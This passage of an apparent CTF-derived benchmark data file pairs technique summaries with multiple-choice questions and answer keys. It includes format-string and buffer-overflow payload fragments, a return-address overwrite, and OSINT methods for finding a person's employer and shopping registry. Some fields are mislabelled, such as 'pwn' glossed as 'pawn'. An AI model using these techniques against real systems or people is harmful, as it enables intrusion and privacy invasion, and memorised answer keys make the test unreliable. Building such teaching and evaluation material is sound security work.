        ],
        "score": 247,
        "max_score": 347,
        "difficulty": 0.7118155619596542,
        "knowledge": [
            "For binary exploitation challenges involving format strings vulnerabilities, leveraging the arbitrary read capability allows for an effective information leak. This is particularly useful when the binary displays its memory content based on the input format string. In situations where the binary's protections (Full RELRO, Stack Canary, NX, PIE) are in place, focusing on arbitrary read through format string vulnerabilities can yield critical information, such as environment variables or potential pointers for further exploitation. \n\n   - Sample payload for leaking stack information:\n     ```python\n     payload = \"%{}$s\".format(offset).encode()\n     ```",
            "When dealing with protected binaries that allow for user input to be directly used in functions like `printf`, experimenting with different offsets is key to bypass protections and access sensitive information. This often involves sending crafted payloads that include format specifiers (e.g., `%s`) in a loop with varying offsets until the desired information is leaked. This approach is helpful when direct exploitation methods are hindered by security protections.\n\n   - Example Python script snippet for iterating over offsets:\n     ```python\n     for i in range(start_offset, end_offset):\n         payload = \"%{}$s\".format(i).encode()\n         target.sendline(payload)\n         # Further commands to interact with the target\n     ```"
        ],
        "question": [
            "Given a binary with Full RELRO, Stack Canary, NX, and PIE enabled, which technique can be effectively used to leak information assuming the binary uses `printf` in a manner susceptible to format string vulnerabilities? - A. Exploiting unchecked buffer overflows. - B. Crafting payloads to utilize format string vulnerabilities for arbitrary reads. - C. Executing a return-to-libc attack to bypass NX. - D. Utilizing race conditions to bypass Stack Canary.",
            "In a scenario where a protected binary processes user input with `printf`, why is it important to test different offsets while crafting a format string exploit? - A. Because different offsets may correspond to different parts of the binary's memory layout, potentially uncovering sensitive information. - B. To determine the exact length of the stack canary value. - C. To exploit heap overflows more effectively by bypassing Full RELRO. - D. To identify which offsets lead to successful SQL injection attacks."
        ],
        "answer": [
            "B",
            "A"
        ]
    },
    {
        "name": "system-write",
        "write_up": "dataset/raw/system-write.md",
        "type": "reverse",
        "competition": [
            "Defcamp/2023/Quals",
            "https://ctftime.org/event/2106/tasks/"
        ],
        "score": 287,
        "max_score": 347,
        "difficulty": 0.8270893371757925,
        "knowledge": [
            "When exploiting a format string vulnerability to leak addresses or write data to arbitrary addresses, it's essential to identify useful pieces of data such as the addresses of functions within the Global Offset Table (GOT) and offsets to critical libc functions (e.g., `system`). This can be performed by crafting payloads that manipulate format string vulnerabilities to read or overwrite memory contents. Specifically, in scenarios where you have control over a format string input to a function like `syslog`, you can leverage this to craft payloads that leak memory addresses or overwrite function pointers to gain control of the execution flow.   \nExample payload for leaking addresses: `%x %x %x %x %x...` to read memory contents.  \nExample payload for overwriting: use the format string `%[value]c%[index]$hn` to write specific bytes to an address.",
            "In exploiting buffer overflow vulnerabilities, especially when PIE (Position Independent Executable) is disabled, and the binary has a buffer overflow vulnerability, it's possible to overwrite local variables, return addresses, or GOT entries to redirect program execution. This technique can be used in tandem with leaking addresses to calculate the base address of libc and ultimately perform an arbitrary code execution, such as executing a `system` call with a desired command. Buffer overflows can be particularly powerful when combined with other vulnerabilities (like format string vulnerabilities) to write arbitrary data into memory and control the flow of execution to achieve code execution within the constraints of the challenge.\nExample payload to exploit buffer overflow and execute arbitrary command: `A * buffer_size + \"/bin/cat flag.txt\"`."
        ],
        "question": [
            "In the context of exploiting format string vulnerabilities to achieve arbitrary write, how can the payload format `%[value]c%[index]$hn` be correctly described? - A. It writes a specific number of bytes equal to `[value]` at the memory location specified by `[index]`. - B. It prints `[value]` characters on the screen without affecting memory. - C. It reads `[value]` bytes from the memory address `[index]`. - D. It uses the value at `[index]` as a pointer to write the content of `[value]`.",
            "When leveraging a buffer overflow vulnerability in a scenario where PIE is disabled to execute an arbitrary command, which example payload correctly demonstrates the concept? - A. `A * buffer_size + system_address` - B. `A * buffer_size + \"/bin/ls\"` - C. `A * 256 + return_address` - D. `A * buffer_size + \"/bin/cat flag.txt\"`"
        ],
        "answer": [
            "A",
            "D"
        ]
    },
    {
        "name": "Take an L",
        "write_up": "dataset/raw/Take an L.md",
        "type": "misc",
        "competition": [
            "CSAW/2018/Quals",
            "https://ctftime.org/event/633/tasks/"
        ],
        "score": 200,
        "max_score": 1285,
        "difficulty": 0.1556420233463035,
        "knowledge": [
            "For challenges involving algorithmic grid filling with constraints, a recursive division strategy can be employed. This approach breaks down the problem into smaller, more manageable subproblems. Specifically, for a grid of size `2^n x 2^n` with a single cell that must remain unfilled, the grid can be divided into four quarters. Each quarter is then solved independently, adjusting the strategy based on the location of the unfilled cell. This method is especially effective when the problem size is a power of two, as it ensures that the division process is evenly balanced.",
            "When designing a filling algorithm for a grid with constraints (like leaving one cell unfilled), consider using a pattern or shape that can be repeated or rotated to cover the entire area without violating the constraint. In the case of tiling a grid with L-shaped tiles while avoiding a specific spot, the solution involves placing a single tile in a strategic position to connect all four quarters of the grid after they have been independently tiled, taking into account the unfilled cell. This approach not only ensures coverage of the grid but also simplifies the tiling process by reducing it to a smaller instance of the problem."
        ],
        "question": [
            "When solving an algorithmic problem that requires filling a `2^n x 2^n` grid with one cell unfilled using a recursive strategy, how does the process of dividing the grid facilitate solving the problem? - A. By increasing the complexity of the unfilled cell positioning, making it easier to place the L-shaped tiles. - B. By dividing the grid into four quarters and solving each quarter independently, adjusting the strategy based on the location of the unfilled cell. - C. By reducing the grid size to a single cell, thus eliminating any need for a filling strategy. - D. By randomly distributing L-shaped tiles until the grid is filled, ignoring the unfilled cell requirement.",
            "In the context of filling a `2^n x 2^n` grid with L-shaped tiles while leaving one specific cell unfilled, which strategy best describes the method for ensuring all areas are covered without violating the unfilled cell constraint? - A. Applying a random placement algorithm until the grid is filled, then removing one tile to create the unfilled cell. - B. Using square-shaped tiles instead of L-shaped tiles to simplify the filling process, disregarding the unfilled cell. - C. Placing a single L-shaped tile in a strategic position to connect all four quarters of the grid after they have been independently tiled. - D. Filing the grid diagonally to avoid the unfilled cell, then replacing any excess tiles with L-shaped ones."
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "Taking Off",
        "write_up": "dataset/raw/Taking Off.md",
        "type": "The type of this challenge is **reverse**.",
        "competition": [
            "angstrom/2020",
            "https://ctftime.org/event/982/tasks/"
        ],
        "score": 70,
        "max_score": 300,
        "difficulty": 0.23333333333333334,
        "knowledge": [
            "In reverse engineering challenges requiring bypassing argument checks, symbolic execution tools like angr can be utilized to automatically solve for acceptable input values. This technique is particularly useful when direct calculation or guesswork is impractical due to the program's complexity or the requirement to meet specific conditions (such as `100 * arg2 + 10 * arg1 + arg3 == 932` in the challenge). By representing arguments as symbolic variables and setting up the program's entry state with these variables, angr can explore various execution paths to find values that lead to the desired program state while avoiding undesired states.",
            "When dealing with string manipulation and condition checks in C++ reverse engineering tasks, encoding or simple bitwise operations (e.g., XOR with a constant) can often be the method used to check for correct input or to disguise data. If the solution to bypass or fulfill these checks isn't immediately apparent through static analysis, dynamic analysis tools or scripts can help identify the correct input by methodically iterating over possible values or by reversing the operation. In the given challenge, the password check involves XORing each character of the input string with `0x2A` and comparing it against a desired value. This kind of operation is reversible, meaning knowing the operation and the target allows for the original input calculation.\n\nSample payload for automatically solving with symbolic execution (using angr as demonstrated in the solution):\n```python\n# Setting up the symbolic variables for arguments\narg1 = claripy.BVS('arg1', 8)\narg2 = claripy.BVS('arg2', 8)\narg3 = claripy.BVS('arg3', 8)\n# Defining the actual arguments to pass, including the symbolic variables\nargv = [proj.filename, arg1, arg2, arg3, 'chicken']\n```\n\nAnd for reversing XOR operation (conceptual, related to the password check):\n```python\n# Assuming 'desired' holds the encoded byte values and 'decoded_password' is where we'll store our decoded characters.\ndecoded_password = \"\".join(chr(byte ^ 0x2A) for byte in desired)\nprint(decoded_password)  # This would print the decoded password if 'desired' array contained the XORed password bytes.\n```"
        ],
        "question": [
            "In a CTF challenge, programmers need to employ symbolic execution tools such as angr to automatically identify acceptable input values for a program. Which of the following best represents how to set up symbolic variables for function arguments in angr? - A. `arg1, arg2, arg3 = claripy.BVS('args', 8*3)` - B. `argv = [claripy.BVS('arg1', 32), 'chicken']` - C. `arg1 = claripy.BVS('arg1', 8); arg2 = claripy.BVS('arg2', 8); arg3 = claripy.BVS('arg3', 8)` - D. `arg1 = claripy.BVV('arg1', 8)`",
            "When reversing a C++ program, you come across a string manipulation section where each character of the input string is XORed with `0x2A` and compared against a given value. How would you correctly reverse this operation to find the original input string? - A. `original_input = \"\".join(chr(ord(c) ^ 0x2A) for c in manipulated_string)` - B. `original_input = manipulated_string ^ 0x2A` - C. `original_input = [b ^ 0x2A for b in bytearray(manipulated_string, 'utf-8')]` - D. `original_input = \"\".join(chr(byte ^ 0x2A) for byte in desired)`"
        ],
        "answer": [
            "C.",
            "D."
        ]
    },
    {
        "name": "tank! bonus",
        "write_up": "dataset/raw/tank! bonus.md",
        "type": "This write-up is for a \"pwn\" (short for \"pawn\") challenge. This type of challenge typically involves exploiting vulnerabilities in a program to gain unauthorized access or control of the system, often through techniques like buffer overflows, format string attacks, or return-oriented programming (ROP). In this case, the write-up describes identifying a vulnerability in a game called \"tank!\", planning an attack to exploit this vulnerability, and ultimately gaining control over the program's execution flow to achieve the desired outcome. The challenge also extends to \"tank! bonus,\" where the exploit evolves to include using libc ROP techniques to achieve the same goal in a slightly different context.",
        "competition": [
            "Square/2023",
            "https://ctftime.org/event/2111/tasks/"
        ],
        "score": 150,
        "max_score": 500,
        "difficulty": 0.3,
        "knowledge": [
            "In challenges involving buffer overflow vulnerabilities where the overflow can affect neighboring variables or data on the stack, it's essential to analyze the layout of the stack to identify key variables that can be altered to benefit the exploit. This includes manipulating constants or bounds checks that are placed adjacent to buffers. By carefully crafting input to overflow a buffer, adjacent variables such as max limits (e.g., max power, max angle) can be changed to remove constraints and further exploit the program.  \n   **Example payload approach**: To exploit the max power and angle variables, ensure the payload alters the specific bytes adjacent to the buffer, such as sending a projectile that overflows the buffer and changes the least significant byte (LSB) of the max power and the most significant byte (MSB) of the max angle to a desired value, like 0x2d for \"-\" symbol.",
            "In scenarios where direct manipulation of target memory addresses or execution flow is restricted, leveraging user inputs or game mechanics to \"place\" required bytes onto the stack or certain memory locations can be a viable strategy. This can involve using aspects of the program that read user input and store it in a way that it becomes part of the execution flow or manipulates the program's state indirectly. Specifically, in cases where control over a return address or similar pointer is needed but directly writing to it is not possible, inputs that end up in the right memory location relative to the controlled overflow can be used to influence program behavior or control flow indirectly.  \n   **Example payload approach**: If an application allows a short, controlled input that is stored on the stack and the overflow vulnerability allows for altering nearby stack values (such as a return address), use a portion of the input field to insert the required byte(s). For instance, in a shooting command \u201cpew!\\n\u201d, appending desired control bytes after this sequence allows placing specific values on the stack. To change a return address to the win function (0x4013de), append the bytes \"\\xde\" at a strategic point in the user input or buffer overflow process, assuming the address space layout randomization (ASLR) can be bypassed or isn't a factor."
        ],
        "question": [
            "In a scenario where a buffer overflow vulnerability adjacent to important variables (max power and max angle) is discovered, which of the following payloads is correct for changing the least significant byte (LSB) of the max power and the most significant byte (MSB) of the max angle to 0x2d, to exploit the game mechanics? - A. Send special ammo that does not affect adjacent variables. - B. Increase the buffer size to avoid overflowing into max power and max angle. - C. Use a projectile that overflows the buffer by one byte on either side, changing the LSB of max power and the MSB of max angle to 0x2d. - D. Directly modify the values of max power and max angle in the game\u2019s source code to 0x2d. ",
            "When direct modification of stack variables like return addresses is not possible, which strategy can effectively place required bytes onto the stack using user inputs, in the context of exploiting a vulnerability where user input is read into a fixed-size array and compared to a string? - A. Request the user to input the exact bytes of the return address without using overflow. - B. Use the game mechanics to directly input the desired return address as part of the normal gameplay without exploiting buffer overflows. - C. Exploit a buffer overflow to directly overwrite the return address without relying on stored inputs. - D. Utilize a controlled input that ends with a user-defined byte, exploiting a buffer overflow to indirectly place this byte in a strategic memory location, such as near a return address. "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "tank!",
        "write_up": "dataset/raw/tank!.md",
        "type": "This write-up details the exploitation of a binary challenge named \"tank!\" and its bonus version, providing in-depth analysis on identifying the vulnerability, planning the attack, creating a payload, and exploiting the vulnerabilities. \n\nBased on the content, the type of challenge described in the write-up is **pwn** (short for \"exploiting binaries by gaining unauthorized access to a server\").",
        "competition": [
            "Square/2023",
            "https://ctftime.org/event/2111/tasks/"
        ],
        "score": 350,
        "max_score": 500,
        "difficulty": 0.7,
        "knowledge": [
            "In scenarios involving buffer overflow vulnerabilities where an application allows for certain controlled overflows, a practical approach is to exploit adjacent variables in memory to extend the overflow's impact. When a program uses adjacent memory locations for variables closely tied to the program's control flow (e.g., max values for input), manipulating these can allow an attacker to significantly alter the program's behavior beyond the intended limits. This technique enables broader exploitation opportunities, such as altering program logic or injecting arbitrary values into the program's execution path. \n\n    - For instance, if a game restricts input angles and power for a projectile within certain limits, but special game mechanics allow for buffer overflow by one byte on either side of a game board array, this overflow can be used to overwrite adjacent `max power` and `max angle` variables. By carefully planning shots that lead to buffer overflow, one can modify these `max power` and `max angle` variables to accept larger values than intended, enabling further overflow possibilities and control over the program.\n    - Example payload to change `max power` and `max angle`: Shoot a projectile with special ammo that lands exactly at the edge of the game board array, causing buffer overflow and modifying the least significant byte of `max power` and the most significant byte of `max angle` with the ammo symbol's ASCII value.",
            "In challenges where injecting or modifying specific values on the stack is required to control program flow (e.g., to call a win function or modify a return address), consider leveraging user inputs that are partially constrained but allow for a controlled byte to be written to memory. Specifically, when a program reads user inputs into an array and uses portions of this input for program logic, the unconstrained section of the input can be manipulated for strategic memory modification.\n\n    - This can be achieved through an application that compares user input with a fixed string but allows for one or more characters in the input buffer to be user-defined and subsequently writes this input to a stack location that is interesting from an exploitation perspective. \n    - Example payload to place specific bytes on the stack: If the program expects the input \"pew!\\n\" and reads the input into a buffer of size 8, leaving the last byte free for user control, an attacker could input \"pew!\\n\\x00\\x13\" (where \\x13 is the byte of interest), utilizing the program's logic to place the byte \\x13 into a strategic memory location (e.g., overwriting the lower two bytes of a function's return address to redirect execution flow)."
        ],
        "question": [
            "In the context of a game where shooting projectiles can lead to buffer overflow by affecting variables adjacent to the game board array in memory, how can an attacker manipulate the `max power` variable to achieve a broader range of attack vectors? - A. By shooting a projectile with regular ammo exactly in the middle of the game board to increase the `max power` limit directly. - B. By exploiting the buffer overflow vulnerability using special ammo to shoot at the edge of the game board, modifying the least significant byte of `max power` with the ammo's ASCII value. - C. By changing the game's source code to increase the `max power` variable manually. - D. By directly editing the game's executable file in a hex editor to search for and modify the `max power` variable. ",
            "When exploiting a vulnerability that requires injecting specific bytes onto the stack by utilizing user inputs, which of the following payloads would successfully overwrite the lower two bytes of a function's return address with 0x13de, enabling control over the program's flow? - A. Inputting \"pew!\\n\\xde\\x13\" when the program reads a 7-byte user input to compare it with \"pew!\\n\", where the last two bytes are designed to overwrite the stack. - B. Filling the entire input buffer with \"AAAAAAA\" to overflow the stack and hoping the overflow reaches the return address. - C. Inputting \"pew!\\n\\x00\\x13de\" assuming the program allows for a 6-byte input and directly writes these values onto the stack. - D. Inputting \"pew!\\n\\x00\\x13\" to utilize the program's logic to place the byte \\x13 into a strategic memory location, assuming the last byte of the input can influence stack values. "
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "taxes",
        "write_up": "dataset/raw/taxes.md",
        "type": "The type of the CTF challenge described in the write-up is **crypto**.",
        "competition": [
            "DiceCTF/2022",
            "https://ctftime.org/event/1541/tasks/"
        ],
        "score": 272,
        "max_score": 500,
        "difficulty": 0.544,
        "knowledge": [
            "To extract text from PDF files programmatically, particularly in scenarios where PDFs contain structured information critical for advancing in cybersecurity challenges, the `pdftotext` tool from the Poppler suite can be very effective. Specifically, the `-raw` option often yields the best results by maintaining the original layout of the text in the PDF while making it accessible for further text-based processing or parsing. This approach can be especially useful when dealing with PDFs that contain forms or structured data that must be analyzed or converted into a different format for automation or data extraction purposes.",
            "When faced with a challenge that involves understanding or interacting with a virtual machine (VM) described in a structured document or set by exploiting simple arithmetic or bitwise operations, a strategic approach is to simulate the VM's behavior through a custom script or program. This involves analyzing the documented VM instructions to identify operations (e.g., push, pop, add, subtract, multiply, xor) and control structures (e.g., conditional jumps or loops), then implementing these operations in a high-level programming language to emulate the VM's execution. This method can uncover hidden data, decode messages, or solve puzzles embedded within the VM's logic, particularly useful in CTF challenges or scenarios requiring reverse engineering of obfuscated algorithms."
        ],
        "question": [
            "When attempting to extract text from structured PDFs for cybersecurity analysis, which tool and option combination is best suited for maintaining the original layout while allowing for further processing?  - A. `pdftotext -layout` - B. `pdf2txt -mode layout` - C. `pdftotext -raw` - D. `pdfparse -structured` ",
            "In a challenge requiring interaction with a virtual machine (VM) described in a document, where VM instructions include arithmetic and bitwise operations, what programming approach is most beneficial for simulating the VM's behavior?  - A. Writing a parser to automatically convert the VM instructions into assembly code. - B. Manually executing each VM instruction and tracking changes on paper. - C. Implementing the VM's operations in a high-level programming language to emulate its execution. - D. Translating VM instructions directly into binary code using a compiler. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "TCC2",
        "write_up": "dataset/raw/TCC2.md",
        "type": "misc",
        "competition": [
            "UMDCTF/2023",
            "https://ctftime.org/event/1949/tasks/"
        ],
        "score": 451,
        "max_score": 500,
        "difficulty": 0.902,
        "knowledge": [
            "When encountering challenges that require finding specific pieces of information about individuals such as their workplace or interests, social engineering research techniques can be effective. Use quoted searches on search engines with known data (e.g., email addresses) to find personal documents or profiles that could contain the needed information. For instance, a quoted search can lead to finding a CV or LinkedIn profile that reveals an individual's employer. Condition: This approach is applicable when you have some piece of personal information (like an email address) about the individual.",
            "In challenges that involve guessing details related to personal preferences or actions, leveraging community platforms (e.g., Discord servers, social media) where the targets are active can yield hints or direct answers. Look for specific threads or comments related to the query. This can also extend to utilizing public registries (like Amazon's Wedding Registry) to find items associated with a person when you have contextual clues (names, event types). Condition: This method is most useful when the challenge pertains to personal decisions or preferences and you have access to the online communities or platforms the individuals might use."
        ],
        "question": [
            "When tasked with finding the company an individual works for and you only have their email address, which of the following techniques is the most effective? - A. Using their email address to sign up for newsletters that might contain work-related information. - B. Searching for the email address in online forums related to their profession. - C. Conducting a quoted search with the email address on search engines to find any publicly associated CVs or profiles. - D. Sending an email asking directly for their professional information hoping for a truthful response.",
            "In a challenge where you need to determine a specific gift someone is planning to buy, based on conversations in a Discord \"Gift\" thread and hints about a public wishlist, what's the best next step? - A. Creating a fake survey and asking them directly for their gift preferences. - B. Accessing the individual's Amazon Registry using hints like the recipient's name to find items matching the discussed category. - C. Guessing popular gifts that fit the vague descriptions and hoping for a match. - D. Sending direct messages to all chat participants asking for further clues about the gift."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "TechSupport",
        "write_up": "dataset/raw/TechSupport.md",
        "type": "This write-up describes a reverse engineering challenge where the participants are required to patch a binary in a way that is not detected. The challenge involves bypassing integrity checks performed via GDB to protect the binary from patching, and making the original binary crash through input manipulation.\n\nTherefore, based on the provided information, the type of this challenge is **reverse**.",
        "competition": [
            "DEFCON/2018/Quals",
            "https://ctftime.org/event/608/tasks/"
        ],
        "score": 177,
        "max_score": 500,
        "difficulty": 0.354,
        "knowledge": [
            "In scenarios involving remote debugging sessions where the challenge server performs integrity checks on a binary to protect against patching, one approach to alter the binary's behavior without triggering integrity checks is to introduce an instruction that crashes the program in a controlled manner. This can be specifically useful when needing to cause a program state that can be externally observed to verify the effect of the modification without being directly caught by checksum-based or similar integrity verifications. Example payload approach involves patching a breakpoint (e.g., `int 3`) into the binary at a strategic location that only gets executed under certain conditions controlled by the attacker.",
            "When dealing with binary challenges that involve calculations and inputs can influence the path or the state of the binary, leveraging overflow vulnerabilities or carefully crafted inputs to manipulate program behavior can be an effective strategy. Specifically, forcing a division by zero through crafted inputs, based on the program's logic to calculate values (like the total weight computed from a chemical formula), allows an attacker to control program flow or state. This technique can be extended to scenarios where manipulating the program's calculation or logic flow can lead to revealing security-sensitive information or altering the program's intended behavior. In the context of the challenge, this involved complex input crafting through linear programming to create a scenario where the division by zero occurs, possibly leveraging specialized libraries like PuLP for Python to generate the inputs that satisfy the specific conditions needed to trigger the vulnerability."
        ],
        "question": [
            "In a scenario where a security professional needs to bypass integrity checks performed by a challenge server during a remote debugging session, what instruction could be strategically inserted into the binary to trigger a controlled crash without being detected? - A. Add a `jmp` instruction to an arbitrary memory address - B. Replace a critical function call with `nop` instructions - C. Insert an `int 3` breakpoint at a location that is conditionally executed - D. Overwrite the return address on the stack with a known value",
            "When leveraging crafted inputs to exploit a program's calculation logic, specifically to cause a division by zero through an overflow, which approach is correct in the context of binary exploitation and manipulation of program behavior? - A. Use a buffer overflow to overwrite a function pointer - B. Craft inputs that cause an integer overflow resulting in a division by zero in the program's logic - C. Inject shellcode into user-controlled input to gain code execution - D. Perform a format string attack to leak memory addresses"
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "teleport",
        "write_up": "dataset/raw/teleport.md",
        "type": "misc",
        "competition": [
            "GoogleCTF/2020",
            "https://ctftime.org/event/1041/tasks/"
        ],
        "score": 474,
        "max_score": 474,
        "difficulty": 1.0,
        "knowledge": [
            "When dealing with challenges that require manipulating the position or state of an entity within constraints, consider using special numerical values like `NaN` (Not a Number) that behave uniquely under those constraints. This approach is particularly useful in languages that handle such values in non-intuitive ways, enabling bypass of checks or limitations. For example, in Python, `float('nan')` comparisons with numbers always return `False`, which can be leveraged to bypass distance checks.\n\n    Example payload: Enter `nan, nan` to move to an undefined position and then `10000000000000, 10000000000000` to reach the target coordinates without triggering the movement distance restriction.",
            "In scenarios where the program logic is based on user input and there are checks on the inputs' outcomes (like distance calculations), consider edge cases or exceptional inputs that the language's standard library functions might incorrectly handle or parse differently than expected. This is applicable in a vast array of programming challenges, especially those involving numeric computations or input validation.\n\n    No specific example payload provided, as this point is more about a general approach than a specific input."
        ],
        "question": [
            "In a Python-based challenge where the goal is to move your player to a specific location but standard movement is severely restricted, how can you bypass the distance check to teleport directly to the target location using a special float value in your input? - A. Use `Infinity, Infinity` because infinity is a large number and allows moving anywhere. - B. Use `float('max'), float('max')` to utilize the maximum float value for unlimited movement. - C. Use `float('nan'), float('nan')` because comparisons with NaN are always False, bypassing checks. - D. Use `0, 0` and claim you've reached the position because zero can sometimes bypass checks. ",
            "When encountering a challenge that involves input validation and distance calculation in Python, which of the following inputs exploit the handling of special numeric values to bypass restrictions without directly causing an overflow or syntax error? - A. Providing `'overflow, overflow'` as input, expecting to exceed the maximum float limit. - B. Using `'1e309, 1e309'` as input, trying to generate infinity and move without restrictions. - C. Inserting `'nan, nan'` as input, exploiting how NaN is processed in comparisons to bypass movement restrictions. - D. Entering `'None, None'` as input, assuming that an undefined state allows unrestricted movement. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Tenet",
        "write_up": "dataset/raw/Tenet.md",
        "type": "reverse",
        "competition": [
            "HITCON/2020",
            "https://ctftime.org/event/1136/tasks/"
        ],
        "score": 222,
        "max_score": 384,
        "difficulty": 0.578125,
        "knowledge": [
            "In a challenge focusing on exploiting a service executing user-supplied shellcode with memory and execution constraints, utilizing processor registers not reset by the execution environment (such as upper 16 bytes of the YMM registers not covered by `user_fpregs_struct`) enables the storage and retrieval of key values across instruction reversals. This approach is particularly useful when the environment resets register states but misses broader architectural features.\n   Example payload snippet for initial forward execution: \n   ```asm\n   mov rax, 0x02170000       ; Direct address manipulation\n   mov [rax], rdi            ; Manipulate memory directly with preserved registers\n   vmovups ymm0, [rax]       ; Utilize YMM registers for data storage beyond reset\n   ```",
            "In a challenge requiring the optimization of an algorithm to decode a flag, where the algorithm's performance drastically reduces with linear scalability issues, converting the algorithm to a mathematically optimized version using properties of linear recurrences and modular arithmetic greatly enhances performance. This is especially applicable for algorithms based on sequences or iterations with predictable patterns that can be mathematically transformed.\n   Example approach breakdown: Convert an iterative algorithm based on a sequence generation into a direct calculation exploiting the mathematical properties of the sequence, reducing time complexity from potentially exponential to linear or constant time."
        ],
        "question": [
            "In a scenario where an execution loop allows shellcode to be executed in reverse to check for a condition like the restoration of a previously cleared memory value, how can one utilize architectural features of the CPU to preserve necessary data across the environment's state reset? - A. Store the data in the stack, and retrieve it after the environment reset - B. Utilize the YMM registers' upper 16 bytes that are not reset by the execution environment to store and retrieve data - C. Encrypt the data before the environment resets, and decrypt it afterwards - D. Write the data to a file in a temporary directory and read it back after the reset ",
            "When optimizing an inefficient algorithm that uses a formula in its iterations and causes performance issues due to its complexity, what approach could significantly enhance its execution time for calculating specific sequence values? - A. Transition the algorithm to a multithreaded model to leverage parallel processing - B. Store intermediate results in a database for quick lookup instead of recalculating values - C. Use caching for sequence values to reduce the number of calculations - D. Replace the iterative sequence generation with a direct formula application, exploiting linear recurrence relations and modular properties to obtain results efficiently "
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "tex_based_adventure",
        "write_up": "dataset/raw/tex_based_adventure.md",
        "type": "reverse",
        "competition": [
            "HXP/2022",
            "https://ctftime.org/event/1845/tasks/"
        ],
        "score": 1000,
        "max_score": 1000,
        "difficulty": 1.0,
        "knowledge": [
            "When faced with code obfuscation that employs character code manipulation, a practical approach to deobfuscation is to analyze the pattern used to alter the characters and then create a script that reverses these changes. For challenges that involve character generation through operations like `chr(32 + (71 + x)%96)`, constructing a reverse operation script that decodes the obfuscated text can be crucial to understanding the underlying logic. This method is especially useful in scenarios where encoded blocks of text are critical for advancing in the challenge.",
            "In challenges involving game logic and state manipulation, particularly those that simulate environments like mazes or puzzles with specific winning conditions, implementing a Breadth-First Search (BFS) algorithm can be highly effective for finding the shortest path to a goal or for simulating game rounds efficiently. This technique is invaluable when the objective includes navigating through complex structures or when needing to compute the minimal sequence of actions to achieve a desired outcome. For example, writing scripts to automate game actions based on current states and possible moves can significantly streamline the process of solving these puzzles.\n\nExample pseudocode for BFS implementation in a maze-like challenge:\n\n```python\nfrom collections import deque\n\ndef bfs(graph, start, goal):\n    visited = set()\n    queue = deque([(start, [])])\n\n    while queue:\n        current, path = queue.popleft()\n        if current == goal:\n            return path\n\n        visited.add(current)\n        for neighbor in graph[current]:\n            if neighbor not in visited:\n                next_path = path + [neighbor]\n                queue.append((neighbor, next_path))\n\n    return None\n\n# Example usage\ngraph = {...}  # Define the graph structure with rooms as nodes and possible moves as edges\nstart = 'StartRoom'\ngoal = 'GoalRoom'\npath = bfs(graph, start, goal)\nprint(f\"Path to victory: {' -> '.join(path)}\")\n```\n\nThis BFS pseudocode can be adapted to the specific requirements of a CTF challenge, such as adding conditions for picking up keys or avoiding enemies, to find the optimal solution path."
        ],
        "question": [
            "In a challenging scenario involving decoding an obfuscated LaTeX document, you stumble upon a code block that generates characters based on their code points using a formula like `chr(32 + (71 + x)%96)`. To reverse the obfuscation and retrieve the original text, which approach would be most effective? - A. Writing a script that directly prints the LaTeX document without modification - B. Manually replacing each generated character with its original value - C. Creating a script that uses a reverse formula to decode the characters based on their manipulated code points - D. Ignoring the obfuscation and focusing on other parts of the document",
            "When faced with a game-based challenge that requires navigating through a complex structure and achieving a specific goal, which algorithm is best suited for efficiently calculating the shortest path or simulating game rounds to solve the puzzle? - A. Implementing a Depth-First Search (DFS) algorithm without considering state or mechanics - B. Using a random walk algorithm and hoping to accidentally find the solution - C. Employing a Breadth-First Search (BFS) algorithm to systematically explore the game environment and compute optimal actions - D. Writing a script that changes game variables to directly reach the winning condition without navigating the structure"
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "The CDR of the CAR",
        "write_up": "dataset/raw/The CDR of the CAR... RAH, RAH, RAH!!!.md",
        "type": "This write-up describes a reverse challenge, as it involves analyzing and understanding a provided code snippet in order to determine the desired output.",
        "competition": [
            "DEADFACE/2023",
            "https://ctftime.org/event/2031/tasks/"
        ],
        "score": -1.0,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving recursive calls and list manipulations, understanding the order and depth of recursion is crucial. The pattern of accessing elements involves alternating between the first element (`car`) and the rest of the list (`cdr`) in a nested manner. This principle can be applied to extract specific elements or sublists from a complex nested list structure.",
            "For challenges that require restructuring lists to match a specific output through recursion, creating a carefully nested structure based on the required recursion pattern is essential. This involves grouping elements into sublists in a way that aligns with the recursive access pattern described in the challenge. Python functions `car(a)` to get the first element of a list `a` and `cdr(a)` to get the rest of the list `a` excluding the first element can be directly applied to navigate and manipulate nested lists.\n\nExample Validation Code:\n\n```python\ndef car(a): return a[0]\ndef cdr(a): return a[1:]\n\n# The list is structured to match the given recursive pattern.\nb = (('ascent','xray',(('yarbrough','jackal',((('minstrel','nevermore','outcast','kitten'),('victor','pugnacious','wallaby','savant','zarf'),('tango','ultimatum','papyrus','quill','renegade','llama','ghost','hellscape','industrious','zombification')),'bestial'),'cadre'),'dark'),'efficacious'),'foundational')\n\n# Applying the recursive pattern to extract the desired sublist.\nprint(cdr(car(cdr(car(car(cdr(cdr(car(car(cdr(cdr(car(b)))))))))))))\n```"
        ],
        "question": [
            "In a Python challenge requiring the extraction of specific elements from a nested list using recursive functions, which functions correctly implement the 'first element' and 'rest of the elements' operations, as demonstrated by the pattern `cdr(car(cdr(car(car(cdr(cdr(car(car(cdr(cdr(car(B))))))))))))` to achieve the desired output? - A. `def car(a): return a[:-1]; def cdr(a): return a[-1]` - B. `def car(a): return a[1:]; def cdr(a): return a[0]` - C. `def car(a): return a[0]; def cdr(a): return a[1:]` - D. `def car(a): return a[-1]; def cdr(a): return a[:-1]`",
